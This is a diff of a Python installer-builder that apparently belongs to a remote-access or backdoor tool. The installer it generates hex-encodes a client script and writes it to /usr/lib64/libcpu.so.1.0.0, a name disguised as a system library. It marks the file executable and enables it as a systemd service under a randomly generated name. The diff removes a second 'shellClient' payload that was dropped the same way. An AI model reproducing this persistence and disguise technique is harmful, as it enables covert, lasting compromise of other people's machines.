@@ -12,9 +12,6 @@ def createInstaller(host):
         f = open('./client.py', 'r')
         clientConts = f.read()
         f.close()
-        f = open('./shellClient.py')
-        shellConts = f.read()
-        f.close()
         f = open('./installer.py', 'w')
         
         contents = """
@@ -22,7 +19,6 @@ def createInstaller(host):
 import os
 import random
 CLIENTCONTS = """ + '"' + clientConts.encode().hex() + '"' + """
-SECCLIENTCONTS = """ + '"' + shellConts.encode().hex() + '"' + """
 
 SERVICE_NAME = """ + '"' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)) + '"' + """
 
@@ -51,13 +47,7 @@ f = open('/usr/lib64/libcpu.so.1.0.0', 'w')
 f.write(CLIENTCONTS)
 f.close()
 
-SECCLIENTCONTS = bytes.fromhex(SECCLIENTCONTS).decode()
-f = open('/usr/lib64/libcpu.so', 'w')
-f.write(SECCLIENTCONTS)
-f.close()
-
 os.system("chmod +x /usr/lib64/libcpu.so.1.0.0")
-os.system("chmod +x /usr/lib64/libcpu.so")
 os.system("systemctl enable " + SERVICE_NAME)
 os.system("systemctl start " + SERVICE_NAME)
 
